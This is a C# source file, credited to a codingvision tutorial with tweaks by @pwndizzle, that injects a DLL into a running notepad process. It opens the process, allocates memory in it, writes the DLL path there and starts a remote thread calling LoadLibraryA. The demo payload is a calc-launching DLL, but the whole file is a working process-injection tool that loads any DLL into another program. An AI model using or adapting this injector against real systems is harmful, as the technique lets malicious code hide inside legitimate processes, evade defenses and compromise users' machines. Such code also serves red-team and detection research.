// This code was originally published on codingvision. 
//http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread
//
// Minor tweaks and commenting by @pwndizzle

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;


public class ProcessInject
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
	
    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // privileges
    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    // used for memory allocation
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;

    public static int Main()
    {
		
        // Get process id
        Console.WriteLine("Get process by name...");
	Process targetProcess = Process.GetProcessesByName("notepad")[0];
	Console.WriteLine("Found procId: " + targetProcess.Id);
		
        // Get handle of the process - with required privileges
	Console.WriteLine("Getting handle to process...");
        IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
        Console.WriteLine("Got procHandle: " + procHandle);
		
        // Get address of LoadLibraryA and store in a pointer
	Console.WriteLine("Getting loadlibrary pointer...");
        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	Console.WriteLine("Loadlibrary pointer: " + loadLibraryAddr);

        // Path to dll that will be injected
        string dllName = "C:\\calc-x64.dll";

        // Allocate memory for dll path and store pointer
	Console.WriteLine("Allocating memory...");
        IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	Console.WriteLine("allocMemAddress: " + allocMemAddress);

        // Write path of dll to memory
	Console.WriteLine("Writing content to memory...");
        UIntPtr bytesWritten;
        bool resp1 = WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
		
	// Read contents of memory
	int bytesRead = 0;
        byte[] buffer = new byte[24];
	Console.WriteLine("Reading content from memory...");
	ReadProcessMemory(procHandle, allocMemAddress, buffer, buffer.Length, ref bytesRead);
        Console.WriteLine("Data in memory: " + System.Text.Encoding.UTF8.GetString(buffer));
		
        // Create a thread that will call LoadLibraryA with allocMemAddress as argument
	Console.WriteLine("CreateRemoteThread");
        CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        
        return 0;
    }
}
